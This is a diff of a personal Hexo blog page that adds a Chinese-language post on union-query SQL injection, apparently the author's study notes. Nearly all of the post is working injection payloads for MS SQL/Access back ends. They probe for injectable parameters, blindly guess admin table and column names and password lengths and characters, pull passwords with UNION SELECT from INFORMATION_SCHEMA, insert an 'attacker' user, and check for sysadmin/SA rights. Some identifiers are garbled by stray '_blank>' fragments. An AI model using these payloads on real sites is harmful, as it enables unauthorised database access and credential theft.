@@ -10,7 +10,7 @@
     
     
     
-    <title>archive_a | Hexo</title>
+    <title>联合查询注入 2 | Hexo</title>
     <link href="https://Edmund0A.github.io" rel="prefetch" />
 
     
@@ -107,7 +107,7 @@
                 
                 
                 
-                <li class="current">
+                <li class="">
                     <a href="/archives">
                         <i class="fa fa-archive"></i>归档
                     </a>
@@ -150,19 +150,27 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <article class="article well article-body" id="article-archive">
+                    
+<article class="article well article-body" id="article">
     <div class="breadcrumb">
         <i class="fa fa-home"></i>
         <a href="https://Edmund0A.github.io">Hexo</a>
         >
-        <span>归档</span>
+        <span>联合查询注入 2</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/archives">归档</a>
+                <a href="/2020/08/16/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%202/">联合查询注入 2</a>
             </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2020-08-16
+            </span>
+            
         </div>
     </div>
     <!-- 小型设备详细文章 -->
@@ -170,59 +178,66 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/archives">归档</a>
+                    <a href="/2020/08/16/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%202/">联合查询注入 2</a>
                 </h4>
             </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2020-08-16
+            </p>
+            <p>
+                
+                
+            </p>
         </center>
     </div>
-    <div class="content-article" style="margin-top: 30px;">
-        
-        
-            <h1 style="font-size: 24px; margin-top: 40px;">2020年</h1>
-            
-        <div class="alert alert-info" style="font-size: 14px; line-height: 2; font-weight: bold;">
-            
-             
-             
-                        <a href="/2020/08/16/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%202/">联合查询注入 2</a>
-                        <br>
-            
-             
-                        <a href="/2020/08/08/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%AC%94%E8%AE%B0_1/">sql注入基本笔记_1</a>
-                        <br>
-            
-             
-                        <a href="/2020/08/01/SQL%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E5%88%A4%E6%96%AD/">SQL注入点的判断</a>
-                        <br>
-            
-             
-                        <a href="/2020/07/26/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">SQL注入绕过</a>
-                        <br>
-            
-             
-                        <a href="/2020/07/19/SQL%E6%B3%A8%E5%85%A5%20-%20-%20-%E7%8C%9C%E8%A7%A3%E5%AE%9E%E8%B7%B5/">SQL注入 - - -猜解实践</a>
-                        <br>
-            
-             
-                        <a href="/2020/07/12/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%9B%9E%E5%A4%B4/">sql注入基础回头</a>
-                        <br>
-            
-             
-                        <a href="/2020/03/29/SQL%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%BB%BA%E7%AB%8B/">SQL靶场的建立</a>
-                        <br>
-            
-             
-                        <a href="/2020/02/15/%E6%9C%AC%E4%BA%BA%E7%9A%84%E9%A6%96%E6%AC%A1%E6%90%AD%E5%BB%BAhexo+github%E5%8D%9A%E5%AE%A2/">本人的首次搭建hexo+github博客</a>
-                        <br>
-            
-             
-                        <a href="/2020/02/07/hello-world/">Hello World</a>
-                        <br>
-            
-                    </div>
-        
+    <div class="content-article">
+        <h1 id="🔺-常用语句"><a href="#🔺-常用语句" class="headerlink" title="🔺 常用语句"></a>🔺 常用语句</h1><p>▲ 判断有无注入点<br>; and 1=1 and 1=2</p>
+<p>▲ 猜表一般的表的名称无非是admin adminuser user pass password 等.. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(select count(*) from *) </span><br><span class="line"><span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表</span><br></pre></td></tr></table></figure>
+
+<p>▲ 猜帐号数目 如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">0</span>&lt;(select count(*) from admin) </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>&lt;(select count(*) from admin)</span><br></pre></td></tr></table></figure>
+
+<p>▲ 猜解字段名称 在len( ) 括号里面加上我们想到的字段名称. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(*)&gt;<span class="number">0</span>)-- </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(用户字段名称name)&gt;<span class="number">0</span>) </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(_blank&gt;密码字段名称password)&gt;<span class="number">0</span>)</span><br><span class="line">▲</span><br></pre></td></tr></table></figure>
+
+<p> 猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(*)&gt;<span class="number">0</span>) </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(name)&gt;<span class="number">6</span>) 错误 </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(name)&gt;<span class="number">5</span>) 正确 长度是<span class="number">6</span> </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(name)=<span class="number">6</span>) 正确</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(password)&gt;<span class="number">11</span>) 正确 </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(password)&gt;<span class="number">12</span>) 错误 长度是<span class="number">12</span> </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where len(password)=<span class="number">12</span>) 正确</span><br><span class="line">▲ 猜解字</span><br></pre></td></tr></table></figure>
+
+<p>符 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where left(name,<span class="number">1</span>)=a) ---猜解用户帐号的第一位 </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select count(*) from admin where left(name,<span class="number">2</span>)=ab)---猜解用户帐号的第二位</span><br></pre></td></tr></table></figure>
+
+<p>就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select top <span class="number">1</span> count(*) from Admin where Asc(mid(pass,<span class="number">5</span>,<span class="number">1</span>))=<span class="number">51</span>) --</span><br></pre></td></tr></table></figure>
+
+<p>这个查询语句可以猜解中文的用户和_blank&gt;密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">group by users.id having <span class="number">1</span>=<span class="number">1</span>-- </span><br><span class="line">group by users.id, users.username, users.password, users.privs having <span class="number">1</span>=<span class="number">1</span>-- </span><br><span class="line">; insert into users values( <span class="number">666</span>, attacker, foobar, <span class="number">0xffff</span> )--</span><br><span class="line">UNION SELECT TOP <span class="number">1</span> COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</span><br><span class="line">WHERE TABLE_blank&gt;_NAME=logintable- </span><br><span class="line">UNION SELECT TOP <span class="number">1</span> COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</span><br><span class="line">WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank&gt;_id)- </span><br><span class="line">UNION SELECT TOP <span class="number">1</span> COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</span><br><span class="line">WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank&gt;_id,login_blank&gt;_name)- </span><br><span class="line">UNION SELECT TOP <span class="number">1</span> login_blank&gt;_name FROM logintable- </span><br><span class="line">UNION SELECT TOP <span class="number">1</span> password FROM logintable where login_blank&gt;_name=Rahul--</span><br></pre></td></tr></table></figure>
+
+<p>▲ 看_blank&gt;服务器打的补丁=出错了打了SP4补丁 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(select @@VERSION)--</span><br></pre></td></tr></table></figure>
+
+<p>▲ 看_blank&gt;数据库连接账号的权限，返回正常，证明是_blank&gt;服务器角色sysadmin权限。 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(SELECT IS_blank&gt;_SRVROLEMEMBER(sysadmin))--</span><br></pre></td></tr></table></figure>
+
+<p>▲ 判断连接_blank&gt;数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA） </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> sa=(SELECT System_blank&gt;_user)-- </span><br><span class="line"><span class="keyword">and</span> user_blank&gt;_name()=dbo-- </span><br><span class="line"><span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(select user_blank&gt;_name()--</span><br></pre></td></tr></table></figure>
+
+
+
+
     </div>
 </article>
+
+
+<div id="comments-template"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script>
+	if(!window.commentConfig) {
+      window.commentConfig = {}
+      window.commentConfig.title = '联合查询注入 2'
+    }
+</script>
+
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
     <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
@@ -412,17 +427,17 @@
 
                 
                 <li>
-                    <a href="/archives/2020/08/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2020/08/16/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%202/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/archives/2020/08/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2020/08/16/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%202/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/archives/2020/08/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2020/08/16/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%202/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
@@ -539,6 +554,30 @@
 <script src="/js/blog.js"></script>
 
 
+
+
+<script src="https://myau.moe/js/comment/gitment.browser.js"></script>
+<script>
+    if(window.commentConfig) {
+      window.commentConfig.id = 'Sun Aug 16 2020 17:33:39 GMT+0800'
+      window.commentConfig.owner = 'Edmund0A'
+      window.commentConfig.repo = ''
+      window.commentConfig.client_id = ''
+      window.commentConfig.client_secret = ''
+      window.commentConfig.redirect_uri = ''
+    } else {
+      window.commentConfig = {
+      	id: 'Sun Aug 16 2020 17:33:39 GMT+0800',
+        owner: 'Edmund0A',
+        repo: '',
+        client_id: '',
+        client_secret: '',
+        redirect_uri: ''
+      }
+    }
+</script>
+
+<script src="/js/comment/gitment.js"></script>
 
 
 </html>
